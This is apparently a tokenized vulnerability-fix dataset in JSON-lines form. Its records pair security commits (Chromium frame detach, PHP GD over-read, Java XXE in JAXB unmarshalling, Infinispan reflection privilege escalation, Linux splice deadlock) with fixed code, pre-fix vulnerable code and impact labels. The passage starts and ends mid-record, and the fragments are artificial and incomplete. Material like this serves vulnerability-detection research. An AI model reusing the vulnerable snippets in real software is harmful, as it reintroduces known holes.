"Cr", "-", "Branched", "-", "From", ":", "f297677702651916bbf65e59c0d4bbd4ce57d1ee", "-", "refs", "/", "heads", "/", "master", "@", "{#", "800218", "}", "diff", "-", "-", "git", "a", "/", "content", "/", "browser", "/", "frame_host", "/", "render_frame_host_impl", ".", "cc", "b", "/", "content", "/", "browser", "/", "frame_host", "/", "render_frame_host_impl", ".", "cc", "index", "8a02ff83c8e40d641530211ef944b62b09a03ac8", ".", ".", "3b78a2c33d5ccad8d0a90df895a1f947faab68b4", "100644", "-", "--", "a", "/", "content", "/", "browser", "/", "frame_host", "/", "render_frame_host_impl", ".", "cc", "b", "/", "content", "/", "browser", "/", "frame_host", "/", "render_frame_host_impl", ".", "cc", "@", "@", "-", "2520", ",", "6", "+", "2520", ",", "9", "@", "@", "void", "RenderFrameHostImpl", ":", ":", "UpdateRenderProcessHostFramePriorities", "(", ")", "{", "}", "void", "RenderFrameHostImpl", ":", ":", "OnDetach", "(", ")", "{", "if", "(", "frame_tree_node_", "-", ">", "render_manager", "(", ")-", ">", "speculative_frame_host", "(", ")", "=", "=", "this", ")", "return", ";", "if", "(", "!", "parent_", ")", "{", "bad_message", ":", ":", "ReceivedBadMessage", "(", "GetProcess", "(", "),", "bad_message", ":", ":", "RFH_DETACH_MAIN_FRAME", ")", ";", "diff", "-", "-", "git", "a", "/", "content", "/", "browser", "/", "site_per_process_browsertest", ".", "cc", "b", "/", "content", "/", "browser", "/", "site_per_process_browsertest", ".", "cc", "index", "eeaddcacdf714dff2c84cd39e69477b87b2462b4", ".", ".", "2d7df6e122bdc5d8270e40d6bbacd68daabe4bd7", "100644", "-", "--", "a", "/", "content", "/", "browser", "/", "site_per_process_browsertest", ".", "cc", "b", "/", "content", "/", "browser", "/", "site_per_process_browsertest", ".", "cc", "@", "@", "-", "10347", ",", "6", "+", "10347", ",", "36", "@", "@", "IN_PROC_BROWSER_TEST_F", "(", "SitePerProcessBrowserTest", ",", "EXPECT_EQ", "(", "\"", "opener", "-", "ping", "-", "reply", "\"", ",", "response", ")", ";", "}", "IN_PROC_BROWSER_TEST_P", "(", "SitePerProcessBrowserTest", ",", "DetachSpeculativeRenderFrameHost", ")", "{", "/", "/", "Commit", "a", "page", "with", "one", "iframe", ".", "GURL", "main_url", "(", "embedded_test_server", "(", ")-", ">", "GetURL", "(", "\"", "a", ".", "com", "\"", ",", "\"", "/", "cross_site_iframe_factory", ".", "html", "?", "a", "(", "a", ")", "\")", ");", "EXPECT_TRUE", "(", "NavigateToURL", "(", "shell", "(", "),", "main_url", ")", ");", "/", "/", "Start", "a", "cross", "-", "site", "navigation", ".", "GURL", "cross_site_url", "(", "embedded_test_server", "(", ")-", ">", "GetURL", "(", "\"", "b", ".", "com", "\"", ",", "\"", "/", "title2", ".", "html", "\"", "))", ";", "TestNavigationManager", "nav_manager", "(", "shell", "(", ")-", ">", "web_contents", "(", "),", "cross_site_url", ")", ";", "BeginNavigateIframeToURL", "(", "web_contents", "(", "),", "\"", "child", "-", "0", "\"", ",", "cross_site_url", ")", ";", "/", "/", "Wait", "for", "the", "request", ",", "but", "don", "'", "t", "commit", "it", "yet", ".", "This", "should", "create", "a", "/", "/", "speculative", "RenderFrameHost", ".", "ASSERT_TRUE", "(", "nav_manager", ".", "WaitForRequestStart", "(", "))", ";", "FrameTreeNode", "*", "root", "=", "web_contents", "(", ")-", ">", "GetFrameTree", "(", ")-", ">", "root", "(", ");", "RenderFrameHostImpl", "*", "speculative_rfh", "=", "root", "-", ">", "current_frame_host", "(", ")", "-", ">", "child_at", "(", "0", ")", "-", ">", "render_manager", "(", ")", "-", ">", "speculative_frame_host", "(", ");", "EXPECT_TRUE", "(", "speculative_rfh", ")", ";", "/", "/", "Currently", ",", "the", "browser", "process", "never", "handles", "an", "explicit", "Detach", "(", ")", "for", "a", "/", "/", "speculative", "RFH", ",", "since", "the", "speculative", "RFH", "or", "the", "entire", "FTN", "is", "always", "/", "/", "destroyed", "before", "the", "renderer", "sends", "this", "IPC", ".", "speculative_rfh", "-", ">", "Detach", "(", ");", "/", "/", "Passes", "if", "there", "is", "no", "crash", ".", "}", "#", "if", "defined", "(", "OS_ANDROID", ")", "namespace", "{", "diff", "-", "-", "git", "a", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "cc", "b", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "cc", "index", "98708c6ac228d6bcc969a980c879de20fa3d3269", ".", ".", "936f9564a19c3fac2339af7c1fde9946008a8537", "100644", "-", "--", "a", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "cc", "b", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "cc", "@", "@", "-", "624", ",", "17", "+", "624", ",", "23", "@", "@", "bool", "NavigateToURL", "(", "WebContents", "*", "web_contents", ",", "}", "bool", "NavigateIframeToURL", "(", "WebContents", "*", "web_contents", ",", "-", "std", ":", ":", "string", "iframe_id", ",", "const", "std", ":", ":", "string", "&", "iframe_id", ",", "const", "GURL", "&", "url", ")", "{", "TestNavigationObserver", "load_observer", "(", "web_contents", ")", ";", "bool", "result", "=", "BeginNavigateIframeToURL", "(", "web_contents", ",", "iframe_id", ",", "url", ")", ";", "load_observer", ".", "Wait", "(", ");", "return", "result", ";", "}", "bool", "BeginNavigateIframeToURL", "(", "WebContents", "*", "web_contents", ",", "const", "std", ":", ":", "string", "&", "iframe_id", ",", "const", "GURL", "&", "url", ")", "{", "std", ":", ":", "string", "script", "=", "base", ":", ":", "StringPrintf", "(", "\"", "setTimeout", "(", "\\\"", "\"", "\"", "var", "iframes", "=", "document", ".", "getElementById", "(", "'%", "s", "'", ");", "iframes", ".", "src", "=", "'%", "s", "'", ";\"", "\"", "\\\"", ",", "0", ")", "\",", "iframe_id", ".", "c_str", "(", "),", "url", ".", "spec", "(", ").", "c_str", "(", "))", ";", "-", "TestNavigationObserver", "load_observer", "(", "web_contents", ")", ";", "-", "bool", "result", "=", "ExecuteScript", "(", "web_contents", ",", "script", ")", ";", "-", "load_observer", ".", "Wait", "(", ");", "-", "return", "result", ";", "return", "ExecuteScript", "(", "web_contents", ",", "script", ")", ";", "}", "void", "NavigateToURLBlockUntilNavigationsComplete", "(", "WebContents", "*", "web_contents", ",", "diff", "-", "-", "git", "a", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "h", "b", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "h", "index", "2861386110a0098104d5cf5456cc7507a2cb0ca7", ".", ".", "21c15c6af4ea0b3a2be1a4ba61c309231e59578c", "100644", "-", "--", "a", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "h", "b", "/", "content", "/", "public", "/", "test", "/", "browser_test_utils", ".", "h", "@", "@", "-", "135", ",", "6", "+", "135", ",", "12", "@", "@", "bool", "NavigateIframeToURL", "(", "WebContents", "*", "web_contents", ",", "std", ":", ":", "string", "iframe_id", ",", "const", "GURL", "&", "url", ")", ";", "/", "/", "Similar", "to", "|", "NavigateIframeToURL", "(", ")|", "but", "returns", "as", "soon", "as", "the", "navigation", "is", "/", "/", "initiated", ".", "bool", "BeginNavigateIframeToURL", "(", "WebContents", "*", "web_contents", ",", "const", "std", ":", ":", "string", "&", "iframe_id", ",", "const", "GURL", "&", "url", ")", ";", "/", "/", "Generate", "a", "URL", "for", "a", "file", "path", "including", "a", "query", "string", ".", "GURL", "GetFileUrlWithQuery", "(", "const", "base", ":", ":", "FilePath", "&", "path", ",", "const", "std", ":", ":", "string", "&", "query_string", ")", ";", "diff", "-", "-", "git", "a", "/", "content", "/", "test", "/", "data", "/", "cross_site_iframe_factory", ".", "html", "b", "/", "content", "/", "test", "/", "data", "/", "cross_site_iframe_factory", ".", "html", "index", "2116189a33566bbd241952d276bb82341fd6ecaf", ".", ".", "43fb6fb6278e5bbc42797b8206b0546351d46e8e", "100644", "-", "--", "a", "/", "content", "/", "test", "/", "data", "/", "cross_site_iframe_factory", ".", "html", "b", "/", "content", "/", "test", "/", "data", "/", "cross_site_iframe_factory", ".", "html", "@", "@", "-", "10", ",", "12", "+", "10", ",", "12", "@", "@", "Example", "usage", "in", "a", "browsertest", ",", "explained", ":", "When", "you", "navigate", "to", "the", "above", "URL", ",", "the", "outer", "document", "(", "on", "a", ".", "com", ")", "will", "create", "a", "single", "iframe", ":", "-", "<", "iframe", "src", "=", "\"", "http", ":", "//", "b", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "b", "(", "c", "(", "),", "d", "(", "))", "\">", "<", "iframe", "id", "=", "\"", "child", "-", "0", "\"", "src", "=", "\"", "http", ":", "//", "b", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "b", "(", "c", "(", "),", "d", "(", "))", "\">", "Inside", "of", "which", ",", "then", ",", "are", "created", "the", "two", "leaf", "iframes", ":", "-", "<", "iframe", "src", "=", "\"", "http", ":", "//", "c", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "c", "(", ")\"", ">", "-", "<", "iframe", "src", "=", "\"", "http", ":", "//", "d", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "d", "(", ")\"", ">", "<", "iframe", "id", "=", "\"", "child", "-", "0", "\"", "src", "=", "\"", "http", ":", "//", "c", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "c", "(", ")\"", ">", "<", "iframe", "id", "=", "\"", "child", "-", "1", "\"", "src", "=", "\"", "http", ":", "//", "d", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "d", "(", ")\"", ">", "Add", "iframe", "options", "by", "enclosing", "them", "in", "'", "{'", "and", "'", "}'", "characters", "after", "the", "hostname", "(", "multiple", "options", "can", "be", "separated", "with", "commas", ")", ":", "@", "@", "-", "24", ",", "8", "+", "24", ",", "8", "@", "@", "hostname", "(", "multiple", "options", "can", "be", "separated", "with", "commas", ")", ":", "Will", "create", "two", "iframes", ":", "-", "<", "iframe", "src", "=", "\"", "http", ":", "//", "a", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "b", "(", ")\"", "allowfullscreen", ">", "-", "<", "iframe", "src", "=", "\"", "http", ":", "//", "c", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "c", "{", "sandbox", "-", "allow", "-", "scripts", "}", "(", "d", "(", "))", "\"", "sandbox", "=", "\"", "allow", "-", "scripts", "\"", ">", "<", "iframe", "id", "=", "\"", "child", "-", "0", "\"", "src", "=", "\"", "http", ":", "//", "a", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "b", "(", ")\"", "allowfullscreen", ">", "<", "iframe", "id", "=", "\"", "child", "-", "1", "\"", "src", "=", "\"", "http", ":", "//", "c", ".", "com", ":", "1234", "/", "cross_site_iframe_factory", ".", "html", "?", "c", "{", "sandbox", "-", "allow", "-", "scripts", "}", "(", "d", "(", "))", "\"", "sandbox", "=", "\"", "allow", "-", "scripts", "\"", ">", "To", "specify", "the", "site", "for", "each", "iframe", ",", "you", "can", "use", "a", "simple", "identifier", "like", "\"", "a", "\"", "or", "\"", "b", "\"", ",", "and", "\"", ".", "com", "\"", "will", "be", "automatically", "appended", ".", "You", "can", "also", "specify", "a", "port</s>"], "docstring_tokens": ["execute", "arbitrary", "code", "or", "cause", "the", "application", "to", "crash", "on", "the", "system"]}
{"contents": ["Fix", "#74435:", "Buffer", "over-read", "into", "uninitialized", "memory", "The", "stack", "allocated", "color", "map", "buffers", "were", "not", "zeroed", "before", "usage,", "and", "so", "undefined", "palette", "indexes", "could", "cause", "information", "leakage."], "code_tokens": ["memset", "(", "ColorMap", ",", "0", ",", "3", "*", "MAXCOLORMAPSIZE", ")", ";", "memset", "(", "localColorMap", ",", "0", ",", "3", "*", "MAXCOLORMAPSIZE", ")", ";", "-", "-", "TEST", "-", "-", "Bug", "#", "74435", "(", "Buffer", "over", "-", "read", "into", "uninitialized", "memory", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "'", "gd", "'", "))", "die", "(", "'", "skip", "gd", "extension", "not", "available", "'", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "im", "=", "imagecreatefromgif", "(", "__DIR__", ".", "DIRECTORY_SEPARATOR", ".", "'", "bug74435", ".", "gif", "'", ");", "var_dump", "(", "$", "im", ")", ";", "$", "width", "=", "imagesx", "(", "$", "im", ")", ";", "$", "height", "=", "imagesy", "(", "$", "im", ")", ";", "for", "(", "$", "i", "=", "0", ";", "$", "i", "<", "$", "width", ";", "$", "i", "+", "=", "16", ")", "{", "for", "(", "$", "j", "=", "0", ";", "$", "j", "<", "$", "height", ";", "$", "j", "+", "=", "16", ")", "{", "if", "(", "($", "index", "=", "imagecolorat", "(", "$", "im", ",", "$", "i", ",", "$", "j", ")", ")", ">", "=", "2", ")", "{", "list", "(", "$", "red", ",", "$", "green", ",", "$", "blue", ",", "$", "alpha", ")", "=", "array_values", "(", "imagecolorsforindex", "(", "$", "im", ",", "$", "index", ")", ");", "if", "(", "$", "red", "!", "==", "0", "|", "|", "$", "green", "!", "==", "0", "|", "|", "$", "blue", "!", "==", "0", "|", "|", "$", "alpha", "!", "==", "0", ")", "{", "echo", "\"", "unexpected", "color", "at", "(", "$", "i", ",", "$", "j", ")", "\\", "n", "\"", ";", "}", "}", "}", "}", "?", ">", "=", "==", "DONE", "=", "==", "-", "-", "EXPECTF", "-", "-", "resource", "(", "%", "d", ")", "of", "type", "(", "gd", ")", "=", "==", "DONE", "=", "==</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "the", "top", "of", "the", "stack"]}
{"contents": ["Fix", "#486"], "code_tokens": ["import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLStreamException", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLStreamReader", ";", "XMLInputFactory", "xmlInputFactory", "=", "XMLInputFactory", ".", "newFactory", "(", ");", "xmlInputFactory", ".", "setProperty", "(", "XMLInputFactory", ".", "IS_SUPPORTING_EXTERNAL_ENTITIES", ",", "false", ")", ";", "xmlInputFactory", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "true", ")", ";", "XMLStreamReader", "xmlStreamReader", "=", "xmlInputFactory", ".", "createXMLStreamReader", "(", "reader", ")", ";", "Unmarshaller", "unmarshaller", "=", "jaxbContext", ".", "createUnmarshaller", "(", ");", "return", "(", "T", ")", "unmarshaller", ".", "unmarshal", "(", "xmlStreamReader", ")", ";", "}", "catch", "(", "JAXBException", "|", "XMLStreamException", "e", ")", "{</s>Unmarshaller", "jaxbUnmarshaller", "=", "jaxbContext", ".", "createUnmarshaller", "(", ");", "return", "(", "T", ")", "jaxbUnmarshaller", ".", "unmarshal", "(", "reader", ")", ";", "}", "catch", "(", "JAXBException", "e", ")", "{"], "docstring_tokens": ["read", "arbitrary", "files"]}
{"contents": ["ISPN-9600", "ReflectionUtil.invokeAccessibly", "should", "not", "be", "public"], "code_tokens": ["import", "java", ".", "lang", ".", "reflect", ".", "InvocationTargetException", ";", "method", ".", "setAccessible", "(", "true", ")", ";", "return", "invokeMethod", "(", "instance", ",", "method", ",", "parameters", ")", ";", "}", "public", "static", "Object", "invokeMethod", "(", "Object", "instance", ",", "Method", "method", ",", "Object", "[", "]", "parameters", ")", "{", "try", "{", "return", "method", ".", "invoke", "(", "instance", ",", "parameters", ")", ";", "}", "catch", "(", "InvocationTargetException", "e", ")", "{", "Throwable", "cause", "=", "e", ".", "getCause", "(", ")", "!", "=", "null", "?", "e", ".", "getCause", "(", ")", ":", "e", ";", "throw", "new", "CacheException", "(", "\"", "Unable", "to", "invoke", "method", "\"", "+", "method", "+", "\"", "on", "object", "of", "type", "\"", "+", "(", "instance", "=", "=", "null", "?", "\"", "null", "\"", ":", "instance", ".", "getClass", "(", ").", "getSimpleName", "(", "))", "(", "parameters", "!", "=", "null", "?", "\"", "with", "parameters", "\"", "+", "Arrays", ".", "asList", "(", "parameters", ")", ":", "\"", "\")", ",", "cause", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "CacheException", "(", "\"", "Unable", "to", "invoke", "method", "\"", "+", "method", "+", "\"", "on", "object", "of", "type", "\"", "+", "(", "instance", "=", "=", "null", "?", "\"", "null", "\"", ":", "instance", ".", "getClass", "(", ").", "getSimpleName", "(", "))", "(", "parameters", "!", "=", "null", "?", "\"", "with", "parameters", "\"", "+", "Arrays", ".", "asList", "(", "parameters", ")", ":", "\"", "\")", ",", "e", ")", ";", "}", "field", ".", "setAccessible", "(", "true", ")", ";", "setField", "(", "instance", ",", "field", ",", "value", ")", ";", "}", "public", "static", "void", "setField", "(", "Object", "instance", ",", "Field", "field", ",", "Object", "value", ")", "{", "(", "instance", "=", "=", "null", "?", "\"", "null", "\"", ":", "instance", ".", "getClass", "(", ").", "getName", "(", "))", "+", "\"", "to", "\"", "+", "value", ",", "e", ")", ";", "import", "static", "org", ".", "infinispan", ".", "commons", ".", "util", ".", "ReflectionUtil", ".", "invokeMethod", ";", "method", ".", "setAccessible", "(", "true", ")", ";", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "List", "<", "Method", ">", ">)", "(", ")", "-", ">", "{", "method", ".", "setAccessible", "(", "true", ")", ";", "return", "null", ";", "}", ");", "return", "invokeMethod", "(", "instance", ",", "method", ",", "Util", ".", "EMPTY_OBJECT_ARRAY", ")", ";", "SecurityActions", ".", "setAccessible", "(", "injectMethodMetadata", ".", "getMethod", "(", "))", ";", "ReflectionUtil", ".", "invokeMethod", "(", "target", ",", "injectMethodMetadata", ".", "getMethod", "(", "),", "params", ")", ";", "SecurityActions", ".", "setAccessible", "(", "injectFieldMetadata", ".", "getField", "(", "))", ";", "ReflectionUtil", ".", "setField", "(", "target", ",", "injectFieldMetadata", ".", "getField", "(", "),", "value", ")", ";", "SecurityActions", ".", "setAccessible", "(", "method", ".", "getMethod", "(", "))", ";", "ReflectionUtil", ".", "invokeMethod", "(", "wrapper", ".", "instance", ",", "method", ".", "getMethod", "(", "),", "null", ")", ";", "SecurityActions", ".", "setAccessible", "(", "method", ".", "getMethod", "(", "))", ";", "ReflectionUtil", ".", "invokeMethod", "(", "wrapper", ".", "instance", ",", "method", ".", "getMethod", "(", "),", "null", ")", ";", "SecurityActions", ".", "setAccessible", "(", "method", ".", "getMethod", "(", "))", ";", "ReflectionUtil", ".", "invokeMethod", "(", "wrapper", ".", "instance", ",", "method", ".", "getMethod", "(", "),", "null", ")", ";", "package", "org", ".", "infinispan", ".", "factories", ".", "impl", ";", "import", "java", ".", "lang", ".", "reflect", ".", "AccessibleObject", ";", "import", "java", ".", "security", ".", "AccessController", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "import", "org", ".", "infinispan", ".", "security", ".", "Security", ";", "import", "org", ".", "infinispan", ".", "util", ".", "logging", ".", "Log", ";", "import", "org", ".", "infinispan", ".", "util", ".", "logging", ".", "LogFactory", ";", "/", "**", "*", "SecurityActions", "for", "the", "org", ".", "infinispan", ".", "factories", "package", ".", "*", "<", "p", ">", "*", "Do", "not", "move", ".", "Do", "not", "change", "class", "and", "method", "visibility", "to", "avoid", "being", "called", "from", "other", "*", "{", "@", "link", "java", ".", "security", ".", "CodeSource", "}", "s", ",", "thus", "granting", "privilege", "escalation", "to", "external", "code", ".", "*", "*", "@", "author", "Dan", "Berindei", "*", "@", "since", "9", ".", "4", "*", "/", "final", "class", "SecurityActions", "{", "private", "static", "final", "Log", "log", "=", "LogFactory", ".", "getLog", "(", "SecurityActions", ".", "class", ")", ";", "static", "<", "T", ">", "void", "doPrivileged", "(", "PrivilegedAction", "<", "T", ">", "runnable", ")", "{", "if", "(", "System", ".", "getSecurityManager", "(", ")", "!", "=", "null", ")", "{", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "Void", ">", ")", "(", ")", "-", ">", "{", "runnable", ".", "run", "(", ");", "return", "null", ";", "}", ");", "}", "else", "{", "Security", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "Void", ">", ")", "(", ")", "-", ">", "{", "runnable", ".", "run", "(", ");", "return", "null", ";", "}", ");", "}", "}", "static", "void", "setAccessible", "(", "AccessibleObject", "member", ")", "{", "doPrivileged", "(", "()", "-", ">", "{", "member", ".", "setAccessible", "(", "true", ")", ";", "return", "null", ";", "}", ");", "}", "}", "@", "@", "-", "1948", ",", "7", "+", "1948", ",", "8", "@", "@", "public", "static", "void", "stopComponent", "(", "Object", "component", ")", "{", "m", ".", "setAccessible", "(", "true", ")", ";", "ReflectionUtil", ".", "invokeMethod", "(", "component", ",", "m", ",", "EMPTY_OBJECT_ARRAY", ")", ";</s>return", "SecurityActions", ".", "invokeAccessibly", "(", "instance", ",", "method", ",", "parameters", ")", ";", "field", ".", "setAccessible", "(", "true", ")", ";", "(", "instance", "=", "=", "null", "?", "\"", "null", "\"", ":", "instance", ".", "getClass", "(", ").", "getName", "(", "))", "+", "\"", "to", "\"", "+", "value", ",", "e", ")", ";", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "import", "java", ".", "lang", ".", "reflect", ".", "InvocationTargetException", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Method", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "org", ".", "infinispan", ".", "commons", ".", "CacheException", ";", "static", "Object", "invokeAccessibly", "(", "Object", "instance", ",", "Method", "method", ",", "Object", "[", "]", "parameters", ")", "{", "return", "doPrivileged", "(", "()", "-", ">", "{", "try", "{", "method", ".", "setAccessible", "(", "true", ")", ";", "return", "method", ".", "invoke", "(", "instance", ",", "parameters", ")", ";", "}", "catch", "(", "InvocationTargetException", "e", ")", "{", "Throwable", "cause", "=", "e", ".", "getCause", "(", ")", "!", "=", "null", "?", "e", ".", "getCause", "(", ")", ":", "e", ";", "throw", "new", "CacheException", "(", "\"", "Unable", "to", "invoke", "method", "\"", "+", "method", "+", "\"", "on", "object", "of", "type", "\"", "+", "(", "instance", "=", "=", "null", "?", "\"", "null", "\"", ":", "instance", ".", "getClass", "(", ").", "getSimpleName", "(", "))", "+", "(", "parameters", "!", "=", "null", "?", "\"", "with", "parameters", "\"", "+", "Arrays", ".", "asList", "(", "parameters", ")", ":", "\"", "\")", ",", "cause", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "CacheException", "(", "\"", "Unable", "to", "invoke", "method", "\"", "+", "method", "+", "\"", "on", "object", "of", "type", "\"", "+", "(", "instance", "=", "=", "null", "?", "\"", "null", "\"", ":", "instance", ".", "getClass", "(", ").", "getSimpleName", "(", "))", "+", "(", "parameters", "!", "=", "null", "?", "\"", "with", "parameters", "\"", "+", "Arrays", ".", "asList", "(", "parameters", ")", ":", "\"", "\")", ",", "e", ")", ";", "}", "}", ");", "}", "import", "static", "org", ".", "infinispan", ".", "commons", ".", "util", ".", "ReflectionUtil", ".", "invokeAccessibly", ";", "Object", "object", ";", "return", "invokeAccessibly", "(", "instance", ",", "method", ",", "Util", ".", "EMPTY_OBJECT_ARRAY", ")", ";", "return", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "Object", ">", ")", "(", ")", "-", ">", "invokeAccessibly", "(", "instance", ",", "method", ",", "Util", ".", "EMPTY_OBJECT_ARRAY", ")", ");", "import", "static", "org", ".", "infinispan", ".", "commons", ".", "util", ".", "ReflectionUtil", ".", "invokeAccessibly", ";", "import", "static", "org", ".", "infinispan", ".", "commons", ".", "util", ".", "ReflectionUtil", ".", "setAccessibly", ";", "import", "java", ".", "security", ".", "AccessController", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "if", "(", "System", ".", "getSecurityManager", "(", ")", "=", "=", "null", ")", "{", "invokeAccessibly", "(", "target", ",", "injectMethodMetadata", ".", "getMethod", "(", "),", "params", ")", ";", "}", "else", "{", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "Object", ">", ")", "(", ")", "-", ">", "invokeAccessibly", "(", "target", ",", "injectMethodMetadata", ".", "getMethod", "(", "),", "params", ")", ");", "}", "if", "(", "System", ".", "getSecurityManager", "(", ")", "=", "=", "null", ")", "{", "setAccessibly", "(", "target", ",", "injectFieldMetadata", ".", "getField", "(", "),", "value", ")", ";", "}", "else", "{", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "Void", ">", ")", "(", ")", "-", ">", "{", "setAccessibly", "(", "target", ",", "injectFieldMetadata", ".", "getField", "(", "),", "value", ")", ";", "return", "null", ";", "}", ");", "}", "ReflectionUtil", ".", "invokeAccessibly", "(", "wrapper", ".", "instance", ",", "method", ".", "getMethod", "(", "),", "null", ")", ";", "ReflectionUtil", ".", "invokeAccessibly", "(", "wrapper", ".", "instance", ",", "method", ".", "getMethod", "(", "),", "null", ")", ";", "ReflectionUtil", ".", "invokeAccessibly", "(", "wrapper", ".", "instance", ",", "method", ".", "getMethod", "(", "),", "null", ")", ";", "ReflectionUtil", ".", "invokeAccessibly", "(", "component", ",", "m", ",", "EMPTY_OBJECT_ARRAY", ")", ";"], "docstring_tokens": ["invoke", "private", "methods", "in", "any", "class", "with", "Infinispan's", "privileges"]}
{"contents": ["splice:", "fix", "deadlock", "in", "splicing", "to", "file", "There's", "a", "possible", "deadlock", "in", "generic_file_splice_write(),", "splice_from_pipe()", "and", "ocfs2_file_splice_write():", "-", "task", "A", "calls", "generic_file_splice_write()", "-", "this", "calls", "inode_double_lock(),", "which", "locks", "i_mutex", "on", "both", "pipe->inode", "and", "target", "inode", "-", "ordering", "depends", "on", "inode", "pointers,", "can", "happen", "that", "pipe->inode", "is", "locked", "first", "-", "__splice_from_pipe()", "needs", "more", "data,", "calls", "pipe_wait()", "-", "this", "releases", "lock", "on", "pipe->inode,", "goes", "to", "interruptible", "sleep", "-", "task", "B", "calls", "generic_file_splice_write(),", "similarly", "to", "the", "first", "-", "this", "locks", "pipe->inode,", "then", "tries", "to", "lock", "inode,", "but", "that", "is", "already", "held", "by", "task", "A", "-", "task", "A", "is", "interrupted,", "it", "tries", "to", "lock", "pipe->inode,", "but", "fails,", "as", "it", "is", "already", "held", "by", "task", "B", "-", "ABBA", "deadlock", "Fix", "this", "by", "explicitly", "ordering", "locks:", "the", "outer", "lock", "must", "be", "on", "target", "inode", "and", "the", "inner", "lock", "(which", "is", "later", "unlocked", "and", "relocked)", "must", "be", "on", "pipe->inode.", "This", "is", "OK,", "pipe", "inodes", "and", "target", "inodes", "form", "two", "nonoverlapping", "sets,", "generic_file_splice_write()", "and", "friends", "are", "not", "called", "with", "a", "target", "which", "is", "a", "pipe.", "Signed-off-by:", "Miklos", "Szeredi", "<mszeredi@suse.cz>", "Acked-by:", "Mark", "Fasheh", "<mfasheh@suse.com>", "Acked-by:", "Jens", "Axboe", "<jens.axboe@oracle.com>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["mutex_lock_nested", "(", "&", "inode", "-", ">", "i_mutex", ",", "I_MUTEX_PARENT", ")", ";", "if", "(", "pipe", "-", ">", "inode", ")", "mutex_lock_nested", "(", "&", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ",", "I_MUTEX_CHILD", ")", ";", "if", "(", "pipe", "-", ">", "inode", ")", "mutex_unlock", "(", "&", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ")", ";", "mutex_unlock", "(", "&", "inode", "-", ">", "i_mutex", ")", ";", "*", "*", "Outer", "lock", "must", "be", "inode", "-", ">", "i_mutex", ",", "as", "pipe_wait", "(", ")", "will", "*", "release", "and", "reacquire", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ",", "AND", "inode", "must", "*", "never", "be", "a", "pipe", ".", "WARN_ON", "(", "S_ISFIFO", "(", "inode", "-", ">", "i_mode", ")", ");", "mutex_lock_nested", "(", "&", "inode", "-", ">", "i_mutex", ",", "I_MUTEX_PARENT", ")", ";", "if", "(", "pipe", "-", ">", "inode", ")", "mutex_lock_nested", "(", "&", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ",", "I_MUTEX_CHILD", ")", ";", "if", "(", "pipe", "-", ">", "inode", ")", "mutex_unlock", "(", "&", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ")", ";", "mutex_unlock", "(", "&", "inode", "-", ">", "i_mutex", ")", ";", "WARN_ON", "(", "S_ISFIFO", "(", "inode", "-", ">", "i_mode", ")", ");", "mutex_lock_nested", "(", "&", "inode", "-", ">", "i_mutex", ",", "I_MUTEX_PARENT", ")", ";", "if", "(", "likely", "(", "!", "ret", ")", ")", "{", "if", "(", "pipe", "-", ">", "inode", ")", "mutex_lock_nested", "(", "&", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ",", "I_MUTEX_CHILD", ")", ";", "if", "(", "pipe", "-", ">", "inode", ")", "mutex_unlock", "(", "&", "pipe", "-", ">", "inode", "-", ">", "i_mutex", ")", ";", "}", "mutex_unlock", "(", "&", "inode", "-", ">", "i_mutex", ")", ";</s>inode_double_lock", "(", "inode", ",", "pipe", "-", ">", "inode", ")", ";", "inode_double_unlock", "(", "inode", ",", "pipe", "-", ">", "inode", ")", ";", "inode_double_lock", "(", "inode", ",", "pipe", "-", ">", "inode", ")", ";", "inode_double_unlock", "(", "inode", ",", "pipe", "-", ">", "inode", ")", ";", "inode_double_lock", "(", "inode", ",", "pipe", "-", ">", "inode", ")", ";", "if", "(", "likely", "(", "!", "ret", ")", ")", "inode_double_unlock", "(", "inode", ",", "pipe", "-", ">", "inode", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", 